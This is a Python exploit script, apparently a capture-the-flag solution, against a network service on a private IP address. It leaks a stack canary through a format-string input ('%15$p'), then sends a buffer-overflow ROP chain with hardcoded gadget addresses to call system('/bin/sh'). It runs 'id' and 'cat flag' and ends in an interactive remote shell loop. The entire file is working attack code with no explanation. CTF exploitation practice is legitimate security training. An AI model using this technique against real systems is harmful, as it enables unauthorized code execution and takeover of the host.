#!/usr/bin/env python3

import socket
import struct
import re

HOST = "10.21.232.223"
PORT = 46558

def p64(x):
    return struct.pack("<Q", x)

s = socket.create_connection((HOST, PORT))

# -----------------------------
# Stage 1: leak stack canary
# -----------------------------

data = s.recv(4096)
print(data.decode(errors="replace"), end="")

s.sendall(b"%15$p\n")

data = s.recv(4096)
print(data.decode(errors="replace"), end="")

m = re.search(rb"0x([0-9a-fA-F]+)", data)
if not m:
    raise RuntimeError("Could not find canary leak")

canary = int(m.group(1), 16)

print(f"[+] canary = {canary:#x}")

# Wait for second prompt
#data = s.recv(4096)
#print(data.decode(errors="replace"), end="")

# -----------------------------
# Stage 2: ROP
# -----------------------------

RET      = 0x40101a
POP_RDI  = 0x40122e
BIN_SH   = 0x402004
SYSTEM   = 0x4010c0

payload  = b"A" * 40
payload += p64(canary)
payload += b"B" * 8
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM)

print(f"[+] payload length = {len(payload)}")

s.sendall(payload + b"\n")

# -----------------------------
# We should now have a shell
# -----------------------------

s.sendall(b"id\n")
print(s.recv(4096).decode(errors="replace"))

s.sendall(b"cat flag\n")
print(s.recv(4096).decode(errors="replace"))

while True:
    try:
        cmd = input("$ ")
        s.sendall(cmd.encode() + b"\n")
        print(s.recv(4096).decode(errors="replace"), end="")
    except (EOFError, KeyboardInterrupt):
        break
